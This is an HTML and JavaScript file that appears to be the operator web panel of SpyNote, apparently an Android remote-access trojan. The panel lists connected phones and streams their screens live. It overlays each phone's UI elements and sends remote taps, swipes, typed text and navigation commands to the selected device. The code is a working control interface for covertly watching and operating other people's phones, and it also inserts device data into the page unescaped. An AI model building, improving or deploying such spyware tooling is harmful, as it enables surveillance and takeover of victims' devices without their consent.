<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote PRO Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: #fff; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; width: 280px; 
            background: rgba(0,0,20,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; border-radius: 15px; 
            backdrop-filter: blur(20px); border: 1px solid #00ff88;
        }
        .device { padding: 15px; margin: 10px 0; background: rgba(255,255,255,0.05); 
            cursor: pointer; border-radius: 10px; transition: all 0.3s; 
            border-left: 4px solid #666; }
        .device:hover { background: rgba(0,255,136,0.1); border-left-color: #00ff88; transform: translateX(5px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
            color: #000; border-left-color: #006644 !important; }
        .disconnected { opacity: 0.4; border-left-color: #ff4444; }

        #phone-container {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 420px; height: 880px; cursor: pointer; touch-action: none;
        }
        #phone-frame {
            width: 100%; height: 100%; background: #111; 
            border: 30px solid #222; border-radius: 60px; 
            position: relative; box-shadow: 0 30px 60px rgba(0,0,0,0.7);
            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
        }
        #screen-canvas { width: 100%; height: 100%; border-radius: 35px; }
        #overlay-canvas { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            border-radius: 35px; pointer-events: none; z-index: 10;
        }

        #status-bar {
            position: fixed; top: 15px; right: 15px; 
            background: rgba(0,0,20,0.95); padding: 15px 20px; 
            border-radius: 12px; backdrop-filter: blur(20px); min-width: 220px;
            border: 1px solid #333;
        }
        #controls {
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 12px; flex-wrap: wrap; justify-content: center;
        }
        button {
            padding: 12px 24px; background: linear-gradient(45deg, #00ff88, #00cc6a);
            color: #000; border: none; border-radius: 25px; cursor: pointer;
            font-weight: 600; transition: all 0.3s; font-size: 14px;
            box-shadow: 0 8px 25px rgba(0,255,136,0.3);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.5); }
        button:active { transform: translateY(0); }
        
        .control-group { display: flex; gap: 8px; align-items: center; }
        input { padding: 8px 12px; border-radius: 20px; border: 1px solid #444; 
            background: rgba(255,255,255,0.1); color: white; width: 120px; }
        
        #element-list {
            position: fixed; right: 15px; top: 200px; width: 280px;
            max-height: 400px; background: rgba(0,0,20,0.95); 
            padding: 15px; border-radius: 12px; backdrop-filter: blur(20px);
            border: 1px solid #333; display: none;
        }
        .ui-element { padding: 8px; margin: 4px 0; background: rgba(255,255,255,0.05);
            border-radius: 6px; cursor: pointer; font-size: 12px; }
        .ui-element:hover { background: rgba(0,255,136,0.2); }
        
        #toggle-overlay { background: linear-gradient(45deg, #ff6b35, #f7931e); }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Connected Devices</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div>Elements: <span id="elementCount">0</span></div>
    </div>

    <div id="element-list">
        <h4>üéØ UI Elements</h4>
        <div id="ui-elements"></div>
    </div>

    <div id="phone-container">
        <div id="phone-frame">
            <canvas id="screen-canvas"></canvas>
            <canvas id="overlay-canvas"></canvas>
        </div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button onclick="toggleOverlay()">üéØ Elements</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
        
        <div class="control-group">
            <input id="textInput" placeholder="Type text" maxlength="50">
            <button onclick="sendText()">‚å®Ô∏è Send</button>
        </div>
        
        <div class="control-group">
            <button onclick="scrollUp()">‚¨ÜÔ∏è Scroll Up</button>
            <button onclick="scrollDown()">‚¨áÔ∏è Scroll Down</button>
        </div>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let elements = [];
        let showOverlay = false;
        let isDragging = false;
        let dragStart = {x: 0, y: 0};

        const screenCanvas = document.getElementById('screen-canvas');
        const overlayCanvas = document.getElementById('overlay-canvas');
        const ctxScreen = screenCanvas.getContext('2d');
        const ctxOverlay = overlayCanvas.getContext('2d');
        const phoneContainer = document.getElementById('phone-container');

        // Socket Events
        socket.on('connect', () => {
            document.getElementById('connectionStatus').textContent = '‚úÖ Connected';
            document.getElementById('connectionStatus').style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            elements = data.elements || [];
            updateElementList(elements);
            
            const img = new Image();
            img.onload = () => {
                screenCanvas.width = overlayCanvas.width = phoneContainer.clientWidth;
                screenCanvas.height = overlayCanvas.height = phoneContainer.clientHeight;
                
                ctxScreen.imageSmoothingEnabled = false;
                ctxScreen.drawImage(img, 0, 0, screenCanvas.width, screenCanvas.height);
                
                if (showOverlay) drawElementsOverlay();
                updateFPS();
            };
            img.src = data.screen;
        });

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small><br>
                        <span style="font-size:10px">${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}</span>
                    </div>
                `).join('') || 'No devices connected';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('selectedDevice').textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
        }

        // üî• PERFECT TOUCH/MOUSE CONTROLS
        function getScaledCoords(clientX, clientY) {
            const rect = phoneContainer.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        phoneContainer.addEventListener('pointerdown', e => {
            e.preventDefault();
            isDragging = true;
            dragStart = getScaledCoords(e.clientX, e.clientY);
        });

        phoneContainer.addEventListener('pointermove', e => {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const end = getScaledCoords(e.clientX, e.clientY);
            socket.emit('control', {
                deviceId: currentDevice, action: 'swipe',
                startX: dragStart.x, startY: dragStart.y,
                endX: end.x, endY: end.y
            });
        });

        phoneContainer.addEventListener('pointerup', e => {
            if (!isDragging || !currentDevice) return;
            const end = getScaledCoords(e.clientX, e.clientY);
            if (Math.abs(end.x - dragStart.x) < 10 && Math.abs(end.y - dragStart.y) < 10) {
                socket.emit('control', {
                    deviceId: currentDevice, action: 'tap',
                    x: dragStart.x, y: dragStart.y
                });
            }
            isDragging = false;
        });

        // üî• ADVANCED CONTROLS
        function sendBack() { socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
        function sendHome() { socket.emit('control', { deviceId: currentDevice, action: 'home' }); }
        function scrollUp() { socket.emit('control', { deviceId: currentDevice, action: 'scroll', direction: 'up' }); }
        function scrollDown() { socket.emit('control', { deviceId: currentDevice, action: 'scroll', direction: 'down' }); }
        
        function sendText() {
            const text = document.getElementById('textInput').value;
            if (text && currentDevice) {
                socket.emit('control', { deviceId: currentDevice, action: 'text', text });
                document.getElementById('textInput').value = '';
            }
        }

        function toggleOverlay() {
            showOverlay = !showOverlay;
            document.getElementById('element-list').style.display = showOverlay ? 'block' : 'none';
            if (showOverlay) drawElementsOverlay();
        }

        function drawElementsOverlay() {
            ctxOverlay.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            if (!elements.length) return;
            
            const rect = phoneContainer.getBoundingClientRect();
            elements.forEach(el => {
                const x = (el.bounds[0] / deviceWidth) * rect.width;
                const y = (el.bounds[1] / deviceHeight) * rect.height;
                const w = ((el.bounds[2] - el.bounds[0]) / deviceWidth) * rect.width;
                const h = ((el.bounds[3] - el.bounds[1]) / deviceHeight) * rect.height;
                
                ctxOverlay.strokeStyle = 'rgba(0,255,136,0.6)';
                ctxOverlay.lineWidth = 2;
                ctxOverlay.strokeRect(x, y, w, h);
                
                ctxOverlay.fillStyle = 'rgba(0,255,136,0.9)';
                ctxOverlay.font = '12px Arial';
                ctxOverlay.fillText(el.text?.slice(0,15) || el.className?.slice(0,15) || 'Element', x, y-5);
            });
        }

        function updateElementList(elements) {
            document.getElementById('elementCount').textContent = elements.length;
            document.getElementById('ui-elements').innerHTML = 
                elements.slice(0, 10).map(el => `
                    <div class="ui-element" onclick="tapElement('${el.id}')">
                        <b>${el.text?.slice(0,20) || 'No text'}</b><br>
                        <small>${el.className || el.resourceName || 'Unknown'}</small>
                    </div>
                `).join('');
        }

        function tapElement(elementId) {
            const el = elements.find(e => e.id === elementId);
            if (el && currentDevice) {
                socket.emit('control', {
                    deviceId: currentDevice, action: 'elementTap',
                    elementId: el.id, text: el.text, bounds: el.bounds
                });
            }
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else document.exitFullscreen();
        }

        let frameCount = 0, lastFrameTime = 0;
        function updateFPS() {
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                frameCount = 0; lastFrameTime = now;
            }
        }

        document.getElementById('textInput').addEventListener('keypress', e => {
            if (e.key === 'Enter') sendText();
        });
    </script>
</body>
</html>
